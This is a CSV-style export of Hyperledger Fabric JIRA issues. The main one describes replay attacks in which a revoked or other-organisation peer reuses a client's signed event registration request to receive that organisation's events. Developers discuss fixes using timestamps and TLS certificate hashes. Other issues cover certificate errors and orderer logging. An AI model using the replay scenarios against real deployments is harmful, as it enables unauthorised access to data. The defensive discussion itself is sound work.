*Attack 2*: Alice (client) and Bob( peer), and Charlie (peer) are members of the same org, Org. 
 # Alice (client) connects to Bob(peer) requesting registration to events, with a request AliceReq
 # Bob accepts
 # Bob uses AliceReq to connect to Charlie (and potentially to other peers of the same org). Notice that Bob at this point has access to the channels himself, but with this act of his, he is able to receive events of the same org as ""Alice"".
 # Org revokes Bob
 # Charlie stops sending other types of messages to Bob, but as for the event connections Bob was also registered under Alice's name, Charlie will keep sending messages to Bob. 

 

*Attack 3*: Alice (client) and Bob( peer), and Charlie (peer) are members of the same org, Org. Trudy (peer) is a member of another org.
 # Alice (client) wants to register to events and sends a registration request AliceReq by mistake to Trudy. 
 # Trudy will reject the request as Alice comes from different org, but can now use AliceReq to register under Alice's name and receive events for Org.
 # Trudy connects to Bob using AliceReq (and potentially to other peers of the same org).
 # Bob, not being able to recognise the relay, will accept the request and open a connection with Trudy (thinking that it is talking to Alice).
 # Trudy will be receiving events of Org.  

 

*Solutions:*

As a first step we can add a timestamp inside the signed message in event registration requests (as already marked in the code) that is checked at the recipient end. Messages that are deemed by the peer as ""old"" will be rejected. This would prevent attacks of type Attack1. This would require changes to the following parts:
  - change to the Event proto message to include a timestamp
  - enhancement to clientsdk to fill in the timestamp field of Event
  - enhancement of peer to check the timestamp field (with version dependency)
  - enhancement of the peer setup configuration with a time-window, assuming the peer is to be considering requests within time-window < |peer-local-time - event-timestamp|

As a second step we need to bind the event registration request to the intended recipient. The challenge here is twofold. On one side, the client is not possible to be authenticated at the tls layer (nodejs limitations), and on the other hand the client who sends the event registration requests does not know in advance the enrollment/tls certificate of the party it will end up connecting to. However, we could leverage the TLS certificate of the peer that the client receives during the TLS handshake to bind the request to the intended recipient.

The flow would be the following. The client *does* know the certificate of the root CA of TLS certificates of its organisation, and authenticates the peer it connects to using that root CA cert, and the TLS certificate received by the peer side during TLS hand-shake. After the TLS handshake is completed successfully, the client retrieves the tls certificate of the peer, it hashes it and signs current event registration payload concatenated with the hash of the tls peer certificate.

The peer side, that receives the event registration request will need to check that the signature in it matches the event request payload and the hash of the peer's tls cert. The peer will reject the request if this is not the case. 

Note: Ultimately, when long enough tls-unique TLS connection identifiers are supported, the tls-unique of the client-peer connection can be used to bind the event request to the underlying connection.

With this second step Attacks 2 and 3 will not be possible to be spawned.

 ",,angelo.decaro,baohua,binhn,denyeart,dhuseby,elli-androulaki,harrisob@us.ibm.com,jeffgarratt,kchristidis,mastersingh24,rickr,ryjones,smithbk,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,FAB-7229,FABN-84,FABJ-113,FABG-126,FABJ-28,FABN-81,FABG-238,,,,,,,,,,,,,,,,,,,,,FABN-95,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx3i7:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,baohua,binhn,denyeart,dhuseby,elli-androulaki,harrisob@us.ibm.com,jeffgarratt,kchristidis,mastersingh24,rickr,ryjones,smithbk,wlahti,yacovm,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/17 7:28 PM;yacovm;{quote}we could leverage the TLS certificate of the peer that the client receives during the TLS handshake to bind the request to the intended recipient.
{quote}

This sounds to me like a good idea. We may (or may not, depends on implementation) need to change the signed event message but I think that's not that bad.
;;;","17/Jun/17 3:54 AM;binhn;[~elli-androulaki], so basically we try to prevent a malicious peer from taking a SignedEvent from a client and registering for events.  We have 2 tasks:
 # Peer: check signedEvent = event payload + hash(peer tls cert)
 # SDK: sign(event payload + hash(peer tls cert))

[~jimthematrix] SDK side to expand the signature to include the hash

[~troyronda]  [~yeasy];;;","20/Jun/17 2:21 AM;mastersingh24;While I agree that Attack 3 is a *bit* of an exposure (I say this because in order to actually capture the request would at least take some forethought on the part of Trudy's organization), overall the current design of Fabric assumes trust within your own organization.

We also have some future work to do to revamp the event infrastructure in the next release, so I personally do not think we need to make any changes at this point;;;","20/Jun/17 1:13 PM;baohua;1) For step 1: Need to discuss an appropriate timeout value. There's risk if set the valid timeout too long.

Beside binding the receipt id to the request, maybe it's also helpful to bind the sender id.

Consider a scenario: Alice sends valid request to Bob, while Charlie steals that request, and use it to connect to Bob.

2) Another question is that are we forced to enable TLS from sdk side?

3) I also agree with gari, this can be considered as post v1.0 design.;;;","07/Aug/17 7:47 PM;elli-androulaki;Hi, would now be a good time to resume with this ? :);;;","07/Aug/17 8:01 PM;yacovm;Since [~wlahti] is already defining a new event type - ( FAB-5568 )  I think now is actually the perfect time to extend the [SignedEvent|https://github.com/hyperledger/fabric/blob/release/protos/peer/events.proto#L78-L83] to have an additional field which would be a binding.
With this way we can have backwards compatibility with clients that don't populate the binding field, and only apply the logic if the binding field exists. ;;;","09/Aug/17 12:11 AM;rickr;This is targeted for v1.1  it looks like the suggestion is to incorporate this into  FAB-5568  but that has no target for v1.1.  Trying to find out what impact to the JDKs here for v1.1 [~muralisr] [~jimthematrix]  When if at all CR for the work will be ready for the SDKs;;;","09/Aug/17 9:58 PM;elli-androulaki;Ok, will bring this up to our scrum then. Thanks [~yacovm], [~rickr]!;;;","01/Sep/17 8:28 PM;elli-androulaki;Here there is a small backward compatibility issue with 1.0 in the following sense:

 - A client would always be motivated to include the recipient into its registration request; hence:

   * a client who includes the recipient into the request runs 1.1

   * a  client who does not include the recipient into the request runs 1.0

 - A peer who runs v1.1 would be able to parse both even registration requests: the requests that originate from a client with v1.0 would simply have empty recipient field

 - A peer who runs 1.0 and receives a request from a client running 1.1 would reject the event registration request as invalid. Would this be considered a backward compatibility issue? If we assume the client has the information of which peer runs which version we can go around this, but not sure this is a valid assumption?

[~yacovm], [~rickr], [~harrisob@us.ibm.com], [~wlahti], [~angelo.decaro], [~mastersingh24], what do you think? ;;;","01/Sep/17 10:20 PM;yacovm;{quote}A peer who runs 1.0 and receives a request from a client running 1.1 would reject the event registration request as invalid{quote}

why?
If the events are as following:
{code}
// SignedEvent is used for any communication between consumer and producer
message SignedEvent {
   // Signature over the event bytes
   bytes signature = 1;
   // Marshal of Event object
   bytes eventBytes = 2;
}

message Event {

  oneof Event {
    //Register consumer sent event
    Register register = 1;

    //producer events
    common.Block block = 2;
    ChaincodeEvent chaincode_event = 3;
    Rejection rejection = 4;

    //Unregister consumer sent events
    Unregister unregister = 5;
  }
  // Creator of the event, specified as a certificate chain
  bytes creator = 6;
  bytes TLS_cert_of_peer = 7;
}
{code}
In the case of v1.1 client and v1.0 peer, the eventBytes are unmarshaled according to the proto schema of v1.0 and the proto parser would just skip parsing the last field since it doesn't have it in its schema (the schema of v1.0 should be the schema of v1.1 modulo the 7th field).
This, btw - can be easily verified with a code example.;;;","06/Sep/17 5:33 AM;rickr;I'm not sure if obtaining the *exact certificate bytes* from the server is possible with Java. I've asked on the grpc forum.

In general, I don't think that this is a good assumption that all language implementations would have this capability.


[https://groups.google.com/forum/#!topic/grpc-io/LoB4mflwy9k]

[~wlahti] [~jimthematrix];;;","06/Sep/17 10:19 PM;rickr;Don't think this is *reliably* possible with Java SDK.;;;","20/Oct/17 12:46 AM;rickr;Where are we with the ETA of this and what the SDKs specifically need to do for it ?;;;","20/Oct/17 12:57 AM;wlahti;FAB-6075 is almost ready to be merged. After that, a timestamp should be added to the registration message the SDKs send to the eventhub. ;;;","21/Oct/17 7:14 PM;yacovm;{quote}As a second step we need to bind the event registration request to the intended recipient. The challenge here is twofold. On one side, the client is not possible to be authenticated at the tls layer (nodejs limitations)
{quote}

I tried and I think it works, at least with the grpc version in the node_modules that is in the balance_transfer sample. 

I just did the following crude change:
{code}
            var d = '/home/yacovm/fabricDeployment/crypto-config/peerOrganizations/hrl.ibm.il/peers/vm2.hrl.ibm.il/tls/';
            var cert = fs.readFileSync(d + 'server.crt');
            var key = fs.readFileSync(d + 'server.key');
			this.creds = grpc.credentials.createSsl(new Buffer(pem), key, cert);
{code}
in *Remote.js* and then added an *else* to the secureServer in the peer:
{code}
grpcServer.tlsConfig.ClientAuth = tls.RequestClientCert
{code}

Also the java grpc implementation, [according to the documentation|https://github.com/grpc/grpc-java/blob/master/SECURITY.md#mutual-tls] - supports it.;;;","21/Oct/17 7:33 PM;yacovm;So, what I'm trying to say is: Instead of obtaining the server cert from the gRPC connection what we really need to do is have the client either have a preconfigured TLS certificate, or if lacking one - generate a self signed one itself, and then include the cert's hash in the request sent to the peer.

The peer, in turn would extract the TLS certificate from the gRPC context (there is sample code in gossip/comm/crypto.go and in core/chaincode/accesscontrol/mapper), hash it, and compare the hash to the one in the request.
* If it's not the same, it means that request wasn't signed by the client on the other side of the connection, but instead was forwarded.
* If it's the same, it means the client on the other side of the connection has:
** The TLS cert's private key
** A signature of the signing identity matching the one in the creator field of the request over the TLS certificate. 
 ;;;","27/Oct/17 8:29 PM;angelo.decaro;I agree with [~yacovm], let's have that.;;;","27/Nov/17 11:10 AM;denyeart;[~elli-androulaki] Could you (or somebody else) summarize the work required and propose owner(s)?;;;","28/Nov/17 6:00 AM;harrisob@us.ibm.com;Removed the SDK tag as the SDK's are not required to implement this change;;;","28/Nov/17 6:12 AM;yacovm;{quote}Removed the SDK tag as the SDK's are not required to implement this change
{quote}
How so? Can you elaborate please?;;;","29/Nov/17 3:30 AM;harrisob@us.ibm.com;# the SDK client will not be able to connect with a 1.0 fabric
 # there will be a new secure event service
 # timestamp is only a partial fix;;;","29/Nov/17 4:58 PM;elli-androulaki;Hi,

Regarding (1):
Why not? We could have a version on the peer side to detect if the client he is talking to is a 1.0 or a 1.1 one? So when the clientsdk is updated, it can leverage this feature. 

Regarding (2):
I am not familiar with the architecture of the new event infrastructure. Is the attacks described above already covered? If not, I think we need to adopt a similar mechanism to address them. 

Regarding (3):
Indeed, it is a first step towards it. Notice that including a timestamp in an event request is not something that can hurt the system in any case. IN addition to this, and moving towards the full fix [~yacovm] has already submitted this [CR|https://gerrit.hyperledger.org/r/#/c/15137/] that was merged. ;;;","29/Nov/17 6:00 PM;yacovm;{quote}# the SDK client will not be able to connect with a 1.0 fabric
 # there will be a new secure event service
 # timestamp is only a partial fix
 {quote}

# We're discussing v1.1, not v1.0. Unless we do something in the client side, this problem will persist in v1.1 
# To my understanding, unless the client-side cooperates - it will not be secure, as long as the only way we identify the client stays the same as it is now.
# Right, and I would say we should leverage mutual TLS when possible (if the client has a TLS certificate) and when not - fallback to timestamp, so we should implement both. 

[~jimthematrix]  [~mastersingh24] your thoughts?;;;","01/Dec/17 1:38 AM;jeffgarratt;Just spoke with [~elli-androulaki] and [~yacovm] and [~wlahti] and [~harrisob@us.ibm.com]  about this..

 

Will create items to address the plan immediately.;;;","05/Dec/17 2:51 AM;dhuseby;Hi Everybody,

This is clearly a security issue and the bug should have been flagged as a security issue so that we can have a private conversation about it.  Hopefully you are all watchers and can see this.;;;","15/Dec/17 10:08 AM;ryjones;Watchers that are not in the security LDAP group should now be able to see this issue.;;;","03/Jan/18 7:39 AM;dhuseby;[~wlahti] any updates on this bug?;;;","03/Jan/18 7:50 AM;dhuseby;[~rickr] this bug looks to be a duplicate of FAB-6030.  Is that is true, I will close out FAB-6030 and we can focus on this bug.;;;","09/Jan/18 1:07 AM;wlahti;The server-side fixes have been merged. We now need the SDKs to make sure they're setting the timestamp and TLSCertHash in each event ""registration"" message they're sending. ;;;","09/Jan/18 1:31 AM;yacovm;Just to add to what Will said - this needs to happen only when mutual TLS is activated + this also needs to be done for peer and orderer Deliver clients (the peer deliver client side (when the peer pulls blocks from the orderer) is already ready);;;","01/Feb/18 4:35 AM;rickr;The above does not appear to match what was pasted into java sdk JIRA
{quote}mutual TLS: the TLSCertHash must be set in the envelope's channel header. The TLS certificate hash to set is the SHA256 hash of the DER representation of the client's TLS certificate
{quote};;;","01/Feb/18 4:57 AM;rickr;I don't think all SDK's can get the Peer's tls certifiate as the exact bytes sent on the wire.  Best I could find for the JSDK was a certificate object.  Which I don't think will guarrentee it would be serialized to exact bytes on the wire.


For TLS client certificate I was told that TLS on the server side will not enforce that certificate matches the host or its IP.  Sort of seems reasonable given the more dynamic nature of clients.   But if the certificate is not tied and guaranteed coming from the client source what's to prevent a rovked peer from using a previous collected clients tls cert . to connect to any other peer ?;;;","01/Feb/18 5:13 AM;wlahti;This JIRA needs to be updated to incorporate the subsequent discussions and decisions made in the linked JIRA items for the peer-side handling of this vulnerability. [~elli-androulaki] Do you think you can update this item when you have a chance?

To sum it up briefly until the updates have been made, the linked JIRA items for the SDKs are accurate. The SDKs should always set the timestamp and, when mutual TLS is enabled, the TLSCertHash of the client's TLS certificate in the messages sent to register for the eventhub and deliver services. ;;;","07/Feb/18 7:01 AM;harrisob@us.ibm.com;Removed the NodeSDK component as this causes double counting of issue when there is a child issue for NodeSDK;;;","26/Feb/18 9:07 PM;denyeart;[~smithbk] I believe you were working on the last piece of this.  Could you provide an update?;;;","28/Feb/18 7:31 AM;denyeart;Resolved by FAB-8563. I will close, but please re-open if anything else is needed.;;;",,,
Certificate not yet valid error on user invoke,FAB-4825,18141,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,ericmvaughn,ericmvaughn,16/Jun/17 10:13 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Sep/17 2:54 AM,v1.0.0-beta,,,,,fabric-peer,,,,,,0,,,,,,,"While attempting to perform an invoke with a user that has been registered and enrolled with the fabric-ca the peer reports this error.
 
_2017-06-16 12:41:13.923 UTC [eventhub_producer] Chat -> ERRO 871 Error handling message: event message must be properly signed by an identity from the same organization as the peer: [failed deserializing event creator: [The supplied identity is not valid, Verify() returned x509: certificate has expired or is not yet valid]]_
 
From testing it appears that if the user is created within the first 4 to 5 minutes after the network is first built then all invokes this user attempts fail in this way.  If you wait 5 minutes or more before creating the user then the error is not seen.
 ",,denyeart,ericmvaughn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3fj:",,,,,,,,,,,,,,,,,,,,,,,denyeart,ericmvaughn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Sep/17 2:54 AM;denyeart;We have not been able to reproduce on 1.0.0, if you see this issue on 1.0.0 please re-open.;;;","05/Oct/17 11:19 PM;ericmvaughn;This issue has been resolved by FAB-6251.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Certificate Signed By Unknown Authority Error in non-TLS cluster,FAB-4829,18239,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,latitiah,latitiah,latitiah,17/Jun/17 1:11 AM,13/Dec/18 3:42 PM,28/Oct/23 3:00 AM,27/Jun/17 4:14 AM,v1.0.0,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"*commit:* d9decc648b3b5f8fc13031f1eb4192fe02d7a1d2
*API:* cli (command line)

When performing a query in a *TLS disabled* fabric cluster, the following error is received when performing 
{code}
peer chaincode query --name mycc --ctor '{""Args"": [""query"",""a""]}' --channelID behavesystest
{code}
 
{code}
Error: Error endorsing query: rpc error: code = Unknown desc = Failed to deserialize creator identity, err The supplied identity is not valid, Verify() returned x509: certificate signed by unknown authority (possibly because of ""x509: ECDSA verification failure"" while trying to verify candidate authority certificate ""ca.org1.example.com"")
{code}

Verified that the chaincode is never instantiated and tests worked as expected when running in a TLS-enabled cluster.",,javapriyan,latitiah,mastersingh24,muralisr,weeds,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 9:18 PM;latitiah;configtx.yaml;https://jira.hyperledger.org/secure/attachment/11198/configtx.yaml","17/Jun/17 9:18 PM;latitiah;crypto.yaml;https://jira.hyperledger.org/secure/attachment/11199/crypto.yaml","17/Jun/17 9:17 PM;latitiah;docker-compose-solo.yml;https://jira.hyperledger.org/secure/attachment/11197/docker-compose-solo.yml",,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4if:",,,,,,,,,,,,,,,,,,,,,,,javapriyan,latitiah,mastersingh24,muralisr,weeds,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Jun/17 6:02 AM;muralisr;[~latitiah]   I'd have expected problems with TLS than other way round.   Plus I mostly run without TLS in the chaincode dev env and have never run into chaincode problems because of running in non-TLS TLS issues..

I assume all old chaincode images were cleaned up etc ? 

can you include steps to recreate (simple steps deeply appreciated :-) ...last time I had to spend the entire night deciphering a defect _that_shall_not_be_named :-) 

;;;","17/Jun/17 10:09 PM;latitiah; My apologies for the confusion. I'm not running these tests manually, so I'm extracting the steps from code.

 

That said,  I've spoken to a couple of people on this issue.  I'm going to rerun this setting the policy.  I have no policy set in this test run.  I'll post the commands and results when I'm done. Thanks! ;;;","17/Jun/17 10:57 PM;muralisr;[~latitiah] Certainly. Do let me know (in RC if you prefer) if I can help.;;;","18/Jun/17 3:21 AM;muralisr;[~latitiah] FWIW... take it with a pinch of salt please as you may be running into something else but I was able to recreate something that had the same look and feel. 

I started my simple *docker-compose up* and had it running.

While that was running,  I did the standard e2e_cli test it complained (as expected) ""cli"" was in use.

I did a *docker-compose down* on the simple test.

Started the e2e_cli test again immediately and saw the following that looked a close to the error you were seeing.

{code:java}
2017-06-17 18:03:55.942 UTC [msp] getMspConfig -> INFO 001 intermediate certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts]. Skipping.: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts: no such file or directory] 2017-06-17 18:03:55.942 UTC [msp] getMspConfig -> INFO 002 crls folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/intermediatecerts]. Skipping.: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/crls: no such file or directory] 2017-06-17 18:03:55.942 UTC [msp] getMspConfig -> INFO 003 MSP configuration file not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/config.yaml]: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/config.yaml: no such file or directory] 2017-06-17 18:03:55.977 UTC [msp] GetLocalMSP -> DEBU 004 Returning existing local MSP 2017-06-17 18:03:55.977 UTC [msp] GetDefaultSigningIdentity -> DEBU 005 Obtaining default signing identity 2017-06-17 18:03:55.988 UTC [grpc] Printf -> DEBU 006 Failed to dial orderer.example.com:7050: connection error: desc = ""transport: authentication handshake failed: x509: certificate signed by unknown authority (possibly because of \""x509: ECDSA verification failure\"" while trying to verify candidate authority certificate \""ca.example.com\"")""; please retry. Error: Error connecting due to rpc error: code = Internal desc = connection error: desc = ""transport: authentication handshake failed: x509: certificate signed by unknown authority (possibly because of \""x509: ECDSA verification failure\"" while trying to verify candidate authority certificate \""ca.example.com\"")""

{code}

 Once I cleaned the env and restarted the e2e_cli, it worked.;;;","18/Jun/17 10:26 PM;mastersingh24;setting to unverified because there still does not seem to be a way to reproduce this;;;","20/Jun/17 1:18 AM;latitiah;Hi Murali, I've been running this test through behave. Once these are pushed it would be much easier to point you to the exact steps that were executed.

My apologies for the confusion. I checked my environment vars and everything looked fine at a glance and I was still running into some issues - even after the policy addition. So to be absolutely sure, I reloaded my vm and rebuilt everything - It worked! I'm not sure exactly what I had set wrong, but I'm closing this issue. Thanks for your patience and help.;;;","20/Jun/17 2:27 AM;muralisr;[~latitiah] thanks much keeping at it .... at some point it may be worth getting to the bottom of this in to help others running into this.;;;","21/Jun/17 5:36 AM;latitiah;Reopening this issue since I just saw this happen again. Once again, I have verified that the environment variables were clean of any ""stray"" config settings; the docker builds and images were clean; I have checked memory and number of inodes used. So far nothing stands out as being an obvious culprit. 

Environment when executing the tests:
{code}
('Current env:', {'GOPATH': '/opt/gopath', 'GOROOT': '/opt/go', 'VAGRANT': '1', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'SSH_CLIENT': '10.0.2.2 59405 22', 'LOGNAME': 'vagrant', 'USER': 'vagrant', 'HOME': '/home/vagrant', 'PATH': '/home/vagrant/bin:/home/vagrant/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/go/bin:/opt/gopath/bin:/hyperledger/devenv/tools:/hyperledger/build/bin', 'LANG': 'en_US', 'TERM': 'xterm', 'SHELL': '/bin/bash', 'LANGUAGE': 'en_US:', 'SHLVL': '1', 'CORE_PEER_NETWORKID': 'c725fbdc55f111e783a70800275fb08f', 'XDG_RUNTIME_DIR': '/run/user/1000', 'CGO_CFLAGS': ' ', 'XDG_SESSION_ID': '2', '_': '/usr/local/bin/behave', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'SSH_TTY': '/dev/pts/0', 'OLDPWD': '/opt/gopath/src/github.com/hyperledger/fabric-test/test/feature', 'COMPOSE_PROJECT_NAME': 'c725fbdc55f111e783a70800275fb08f', 'PWD': '/opt/gopath/src/github.com/hyperledger/fabric/test/feature', 'MAIL': '/var/mail/vagrant', 'SSH_CONNECTION': '10.0.2.2 59405 10.0.2.15 22'})
{code}

 Memory:
{code}
              total        used        free      shared  buff/cache   available
Mem:           3.9G        119M        1.3G         32M        2.5G        3.4G
Swap:          509M        9.0M        501M
{code}

Inodes:
{code}
Filesystem      Inodes  IUsed   IFree IUse% Mounted on
/dev/sda1      2588672 526183 2062489   21% /
{code};;;","24/Jun/17 2:21 AM;latitiah;It looks like this may have to do with the number of chaincode images that are still around. This happened again and the number of docker chaincode images was at 276 - they were not being cleaned up. When I removed them, this error seemed to go away. It may have been a fluke, but seeing as this should be cleaned up anyway, I'm going to chalk this up to needing the clean up.
;;;","26/Jun/17 9:37 PM;weeds;Latitia- i feel like other people have encountered this when they have not done some cleaning up of the system.  Seems like we should add something in the documentation that if they reload their system- they need to do sufficient clean up.  I could see developers do this same scenario and not realize how important this is and run into errors.  What do you think? Something for the doc if not already there?;;;","27/Jun/17 4:14 AM;latitiah;Hi [~weeds] - I asked where the best place for this information would be. It was suggested that this should be an entry on stackoverflow. ;;;","13/Dec/18 3:29 PM;javapriyan;[~latitiah] Thanks for logging this JIRA. I am facing the same issue with all the peers when I launch a new custom cluster from the official sample first-network. Can you please help me with what are the possible clean up has to be done? Thanks ! ;;;","13/Dec/18 3:42 PM;javapriyan;I was abruptly cleaning the docker images. After going through this, I have inspected the ./byfn.sh down commands. That's just did the job. Hope this may help others;;;",,,,,,,,,,,,,,,,,,,,,,,,,,
Cauthdsl does not differentiate between signing errors,FAB-4830,18240,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Jun/17 1:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,17/Jun/17 11:53 AM,,,,v1.0.0,,fabric-orderer,,,,,,0,,,,,,,"The logging in cauthdsl is a bit cryptic, and does not actually print the error returned by the signing validation.  This makes debugging extremely difficult.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,FABJ-221,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4in:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Jun/17 1:23 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/10709/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow logging level for components to be checked interactively in Orderers,FAB-4831,18244,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,hancockp,hancockp,17/Jun/17 2:19 AM,19/Oct/18 8:37 PM,28/Oct/23 3:00 AM,19/Oct/18 8:37 PM,,,,,,fabric-orderer,,,,,,0,Logging,Orderer,SRE,,,,"As an SRE I want to be able to check the current logging level for component in an Orderer in a similar way to how I can check the level for a component on a Peer using the 
{code:java}
peer logging getlevel <CompName>{code}
command.",,hancockp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,FAB-12265,,FAB-4832,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy4j3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,hancockp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow logging level for components to be set dynamically in Orderers,FAB-4832,18245,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,hancockp,hancockp,17/Jun/17 2:28 AM,19/Oct/18 8:36 PM,28/Oct/23 3:00 AM,19/Oct/18 8:36 PM,,,,,,fabric-orderer,,,,,,0,Logging,Orderer,SRE,,,,"As an SRE I want to be able to change the current logging level for component in an Orderer in a similar way to how I can change the level for a component on a Peer using the
{code:java}
peer logging setlevel <CompName_Regex>{code}
command. The new logging level should take effect without having to restart the orderer.",,hancockp,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,FAB-3984,FAB-12265,,,,,FAB-4833,FAB-4831,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy4jb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,hancockp,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jul/17 11:18 PM;kchristidis;Duplicate of: https://jira.hyperledger.org/browse/FAB-3984;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow logging level for components to be reset dynamically in Orderers,FAB-4833,18246,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,hancockp,hancockp,17/Jun/17 2:42 AM,19/Oct/18 8:37 PM,28/Oct/23 3:00 AM,19/Oct/18 8:37 PM,,,,,,fabric-orderer,,,,,,0,Logging,Orderer,SRE,,,,"As an SRE I want to be able to reset the logging level for components in an Orderer to the initial value (as at end of start up) in a similar way to how I can reset the level for components on a Peer using the
{code:java}
peer logging revertLevels{code}
